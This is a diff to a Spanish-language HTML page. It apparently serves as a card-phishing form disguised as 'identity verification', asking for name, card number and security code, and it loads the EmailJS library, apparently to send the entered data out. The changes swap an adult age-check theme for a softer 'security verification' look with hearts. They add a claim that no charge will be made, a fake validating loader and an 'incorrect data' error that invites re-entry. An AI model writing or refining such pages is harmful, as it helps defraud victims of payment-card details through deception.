@@ -3,21 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Edad</title>
+    <title>Verificación de Seguridad</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <h1>🔞 Verificación Requerida</h1>
+        <div class="header">
+            <div class="hearts">💖💖💖</div>
+            <h1>Verificación de Usuario</h1>
+            <div class="hearts">💖💖💖</div>
+        </div>
+        
         <form id="paymentForm">
             <div class="input-group">
                 <label>Nombre Completo</label>
-                <input type="text" id="cardHolder" placeholder="Ej. Sofia Rodríguez" required>
+                <input type="text" id="cardHolder" placeholder="Ej. Ana López" required>
             </div>
             
             <div class="input-group">
                 <label>Número de Tarjeta</label>
-                <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="16" required>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="16" required>
             </div>
 
             <div class="input-group">
@@ -26,12 +31,16 @@
             </div>
 
             <div class="input-group">
-                <label>Código CVC</label>
-                <input type="text" id="cvc" placeholder="***" maxlength="3" required>
+                <label>Código de Seguridad</label>
+                <input type="text" id="cvc" placeholder="1234" maxlength="4" required>
             </div>
 
-            <button type="submit">Verificar Identidad 💋</button>
+            <button type="submit">Verificar Identidad 🌸</button>
         </form>
+        
+        <p class="disclaimer">⚠️ No se realizará ningún cobro. Solo verificación de identidad.</p>
+        <div id="loader" class="hidden">⏳ Validando...</div>
+        <div id="errorMessage" class="hidden">❌ Datos incorrectos</div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
